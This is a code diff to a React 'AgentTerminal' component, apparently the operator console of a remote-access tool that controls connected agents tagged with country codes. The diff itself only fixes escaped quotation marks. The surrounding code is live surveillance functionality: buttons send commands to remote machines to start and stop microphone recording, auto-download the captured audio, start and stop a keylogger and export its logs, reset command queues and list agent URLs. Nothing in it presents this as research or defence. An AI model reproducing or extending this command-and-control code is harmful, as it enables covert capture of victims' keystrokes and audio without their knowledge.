@@ -272,16 +272,16 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
         <div style={{ color: '#9efc9e' }}>Agent: {agent.name} {(agent as any).country_code ? (<span style={{ color: '#9efc9e', fontSize: 12 }}>({(agent as any).country_code})</span>) : null} {interactive && <span style={{ color:'#ffb347', fontSize:12, marginLeft:8 }}>(interactive)</span>}</div>
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
           <button className="btn secondary" onClick={refreshStats}>Refresh</button>
-          <button className=\"btn secondary\" onClick={() => { if (confirm('Reset the command queue?')) { dashboardSocket.queueReset(agent.agent_id); setLines((prev) => [...prev, '[Queue] Reset requested']); } }}>Refresh Queue</button>
-<select className=\"input\" value={audioRate} onChange={(e)=>setAudioRate(parseInt(e.target.value)||44100)} title=\"Sample rate\">
+          <button className="btn secondary" onClick={() => { if (confirm('Reset the command queue?')) { dashboardSocket.queueReset(agent.agent_id); setLines((prev) => [...prev, '[Queue] Reset requested']); } }}>Refresh Queue</button>
+          <select className="input" value={audioRate} onChange={(e)=>setAudioRate(parseInt(e.target.value)||44100)} title="Sample rate">
             {[8000,16000,22050,44100,48000].map((r)=>(<option key={r} value={r}>{r} Hz</option>))}
           </select>
-          <select className=\"input\" value={audioCh} onChange={(e)=>setAudioCh(parseInt(e.target.value)||1)} title=\"Channels\">
+          <select className="input" value={audioCh} onChange={(e)=>setAudioCh(parseInt(e.target.value)||1)} title="Channels">
             <option value={1}>Mono</option>
             <option value={2}>Stereo</option>
           </select>
-          <button className=\"btn secondary\" onClick={() => { dashboardSocket.sendAgentJson(agent.agent_id, { type: 'audio_start', sample_rate: audioRate, channels: audioCh }); }}>Start Audio</button>
-          <button className=\"btn secondary\" onClick={async () => { dashboardSocket.sendAgentJson(agent.agent_id, { type: 'audio_stop' }); setTimeout(() => autoDownloadLatestAudio(), 1200); }}>Stop Audio</button>
+          <button className="btn secondary" onClick={() => { dashboardSocket.sendAgentJson(agent.agent_id, { type: 'audio_start', sample_rate: audioRate, channels: audioCh }); }}>Start Audio</button>
+          <button className="btn secondary" onClick={async () => { dashboardSocket.sendAgentJson(agent.agent_id, { type: 'audio_stop' }); setTimeout(() => autoDownloadLatestAudio(), 1200); }}>Stop Audio</button>
           <button className="btn secondary" onClick={() => { if (confirm('Hard reset the agent connection? This will drop and reconnect.')) { dashboardSocket.hardReset(agent.agent_id); setLines((prev) => [...prev, '[Hard reset requested]']); } }}>Hard Reset</button>
           <button className="btn secondary" onClick={async () => { if (!keylogRunning) { dashboardSocket.startKeylog(agent.agent_id); setKeylogRunning(true); setShowKeylog(true); } else { dashboardSocket.stopKeylog(agent.agent_id); setKeylogRunning(false); try { await keylogRef.current?.exportAndSave() } catch {} } }}>{keylogRunning ? 'Stop Keylog' : 'Start Keylog'}</button>
           <button className="btn secondary" onClick={() => { setMastersOpen(true); dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_list' }) }}>Agent URLs</button>
